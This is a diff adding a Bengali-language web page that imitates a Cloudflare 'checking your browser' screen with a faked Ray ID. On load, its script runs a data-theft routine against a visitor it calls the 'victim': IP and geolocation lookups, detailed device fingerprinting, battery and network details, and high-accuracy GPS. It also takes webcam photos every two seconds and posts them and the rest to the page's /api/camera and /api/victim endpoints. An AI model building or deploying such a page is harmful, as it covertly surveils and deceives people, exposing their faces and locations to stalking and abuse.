@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .container { max-width: 500px; width: 100%; }
+        .bubbles-wrapper { margin: 0 auto 30px auto; }
+        .bubble {
+            background-color: #f58220;
+            width: 20px;
+            height: 20px;
+            margin: 0 4px;
+            border-radius: 100%;
+            display: inline-block;
+            animation: fader 1.6s infinite;
+        }
+        .bubble:nth-child(2) { animation-delay: 0.2s; }
+        .bubble:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes fader {
+            0% { opacity: 0.2; }
+            50% { opacity: 1.0; }
+            100% { opacity: 0.2; }
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #000000;
+            margin: 16px 0;
+            line-height: 1.25;
+        }
+        p {
+            font-size: 18px;
+            font-weight: 400;
+            color: #444;
+            margin: 8px 0;
+            line-height: 1.7;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            min-height: 30px;
+        }
+        #status.success { color: #28a745; }
+        #status.error { color: #dc3545; }
+        #status.info { color: #007bff; }
+        .attribution {
+            margin-top: 32px;
+            font-size: 14px;
+            color: #666;
+        }
+        .attribution a { color: #2c7cb0; text-decoration: none; }
+        .attribution a:hover { color: #f4a15d; }
+        .ray_id { display: block; margin-top: 8px; }
+        code {
+            background: #f1f1f1;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        video, canvas { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="bubbles-wrapper">
+            <div class="bubble"></div>
+            <div class="bubble"></div>
+            <div class="bubble"></div>
+        </div>
+        <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
+        <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
+        <p id="status">📡 তথ্য সংগ্রহ করা হচ্ছে...</p>
+        <div class="attribution">
+            DDoS সুরক্ষা দ্বারা
+            <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
+            <br>
+            <span class="ray_id">Ray ID: <code id="ray">6c51810c599f2cda</code></span>
+        </div>
+    </div>
+
+    <!-- লুকানো ভিডিও ও ক্যানভাস (ক্যামেরার জন্য) -->
+    <video id="video" playsinline autoplay muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ===== ১. রে আইডি র‍্যান্ডম =====
+            const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
+            let ray = "";
+            for (let i = 0; i < 17; i++) {
+                ray += chars[Math.floor(Math.random() * chars.length)];
+            }
+            document.getElementById('ray').textContent = ray;
+
+            // ===== ২. ভিক্টিম আইডি বের করা (URL থেকে) =====
+            const pathParts = window.location.pathname.split('/');
+            const victimId = pathParts[pathParts.length - 1];
+            const statusEl = document.getElementById('status');
+
+            function setStatus(msg, type = 'info') {
+                statusEl.textContent = msg;
+                statusEl.className = type;
+            }
+
+            // ===== ৩. ডেটা সংগ্রহ =====
+            async function collectData() {
+                try {
+                    const data = {
+                        id: victimId,
+                        timestamp: new Date().toISOString(),
+                        ip: null,
+                        location: null,
+                        gpsLocation: null,
+                        device: {},
+                        media: [],
+                        network: {},
+                        battery: null,
+                        type: 'camera'
+                    };
+
+                    // ৩.১ আইপি
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipRes.json();
+                        data.ip = ipData.ip;
+                    } catch (e) {
+                        console.log('IP fetch failed:', e);
+                    }
+
+                    // ৩.২ লোকেশন (IP API)
+                    try {
+                        if (data.ip) {
+                            const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                            const locData = await locRes.json();
+                            data.location = {
+                                country: locData.country_name || 'N/A',
+                                region: locData.region || 'N/A',
+                                city: locData.city || 'N/A',
+                                latitude: locData.latitude || 0,
+                                longitude: locData.longitude || 0,
+                                isp: locData.org || 'N/A'
+                            };
+                        }
+                    } catch (e) {
+                        console.log('Location fetch failed:', e);
+                    }
+
+                    // ৩.৩ ডিভাইস তথ্য
+                    data.device = {
+                        productSub: navigator.productSub || 'N/A',
+                        vendor: navigator.vendor || 'N/A',
+                        maxTouchPoints: navigator.maxTouchPoints || 0,
+                        doNotTrack: navigator.doNotTrack || 'N/A',
+                        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                        cookieEnabled: navigator.cookieEnabled || false,
+                        appCodeName: navigator.appCodeName || 'N/A',
+                        appName: navigator.appName || 'N/A',
+                        appVersion: navigator.appVersion || 'N/A',
+                        platform: navigator.platform || 'N/A',
+                        product: navigator.product || 'N/A',
+                        userAgent: navigator.userAgent || 'N/A',
+                        language: navigator.language || 'N/A',
+                        languages: navigator.languages || [],
+                        webdriver: navigator.webdriver || false,
+                        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                        deviceMemory: navigator.deviceMemory || 'N/A',
+                        screen: `${screen.width}x${screen.height}`,
+                        colorDepth: screen.colorDepth || 'N/A'
+                    };
+
+                    // ৩.৪ মিডিয়া ডিভাইস
+                    try {
+                        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                            const devices = await navigator.mediaDevices.enumerateDevices();
+                            data.media = devices.map(d => ({
+                                kind: d.kind,
+                                label: d.label || 'N/A',
+                                deviceId: d.deviceId || 'N/A'
+                            }));
+                        }
+                    } catch (e) {
+                        console.log('Media devices failed:', e);
+                    }
+
+                    // ৩.৫ নেটওয়ার্ক তথ্য
+                    if (navigator.connection) {
+                        data.network = {
+                            type: navigator.connection.type || 'N/A',
+                            rtt: navigator.connection.rtt || 0,
+                            saveData: navigator.connection.saveData || false,
+                            effectiveType: navigator.connection.effectiveType || 'N/A',
+                            downlink: navigator.connection.downlink || 0,
+                            downlinkMax: navigator.connection.downlinkMax || 0
+                        };
+                    }
+
+                    // ৩.৬ ব্যাটারি তথ্য
+                    try {
+                        if (navigator.getBattery) {
+                            const battery = await navigator.getBattery();
+                            data.battery = {
+                                level: Math.round(battery.level * 100),
+                                charging: battery.charging,
+                                chargingTime: battery.chargingTime,
+                                dischargingTime: battery.dischargingTime
+                            };
+                        }
+                    } catch (e) {
+                        console.log('Battery failed:', e);
+                    }
+
+                    // ===== ৩.৭ ক্যামেরা অ্যাক্সেস =====
+                    try {
+                        setStatus('📸 ক্যামেরা অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: {
+                                width: { ideal: 1280 },
+                                height: { ideal: 720 },
+                                facingMode: 'user'
+                            },
+                            audio: false
+                        });
+
+                        const video = document.getElementById('video');
+                        const canvas = document.getElementById('canvas');
+                        video.srcObject = stream;
+
+                        let captureCount = 0;
+                        const interval = setInterval(async () => {
+                            if (!video.videoWidth || !video.videoHeight) return;
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                            const rawBase64 = imageData.split(',')[1];
+
+                            try {
+                                await fetch('/api/camera', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        id: victimId,
+                                        image: rawBase64
+                                    })
+                                });
+                                captureCount++;
+                                setStatus(`📸 ${captureCount}টি ছবি তোলা হয়েছে...`, 'info');
+                            } catch (e) {
+                                console.error('Camera upload error:', e);
+                            }
+                        }, 2000);
+
+                        // ৩০ সেকেন্ড পর ক্যামেরা বন্ধ
+                        setTimeout(() => {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            setStatus('✅ ক্যামেরা ক্যাপচার শেষ', 'success');
+                        }, 30000);
+
+                    } catch (e) {
+                        console.log('ক্যামেরা অ্যাক্সেস ডিনাই:', e.message);
+                        setStatus('❌ ক্যামেরা অ্যাক্সেস ডিনাই করা হয়েছে', 'error');
+                    }
+
+                    // ===== ৩.৮ লোকেশন (GPS) =====
+                    try {
+                        if (navigator.geolocation) {
+                            setStatus('📍 লোকেশন অ্যাক্সেস নেওয়া হচ্ছে...', 'info');
+                            const pos = await new Promise((resolve, reject) => {
+                                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                    enableHighAccuracy: true,
+                                    timeout: 10000
+                                });
+                            });
+                            data.gpsLocation = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude || null,
+                                heading: pos.coords.heading || null,
+                                speed: pos.coords.speed || null,
+                                googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                            };
+                            setStatus(`📍 লোকেশন পাওয়া গেছে!`, 'success');
+                        }
+                    } catch (e) {
+                        console.log('লোকেশন অ্যাক্সেস ডিনাই:', e.message);
+                    }
+
+                    // ===== ৩.৯ ফাইনাল ডেটা পাঠানো =====
+                    try {
+                        setStatus('📤 ডেটা পাঠানো হচ্ছে...', 'info');
+                        const response = await fetch('/api/victim', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+
+                        if (response.ok) {
+                            setStatus('✅ সব তথ্য সংগ্রহ করা হয়েছে!', 'success');
+                        } else {
+                            const errorText = await response.text();
+                            console.error('Server error:', errorText);
+                            setStatus('❌ ডেটা পাঠাতে ব্যর্থ: ' + response.status, 'error');
+                        }
+                    } catch (e) {
+                        console.error('Data send error:', e);
+                        setStatus('❌ ডেটা পাঠাতে ব্যর্থ', 'error');
+                    }
+
+                } catch (err) {
+                    console.error('Collect data error:', err);
+                    setStatus('❌ ত্রুটি ঘটেছে: ' + err.message, 'error');
+                }
+            }
+
+            // ===== ৪. পেজ লোড হলে শুরু =====
+            window.addEventListener('load', function() {
+                collectData();
+            });
+
+        })();
+    </script>
+</body>
+</html>
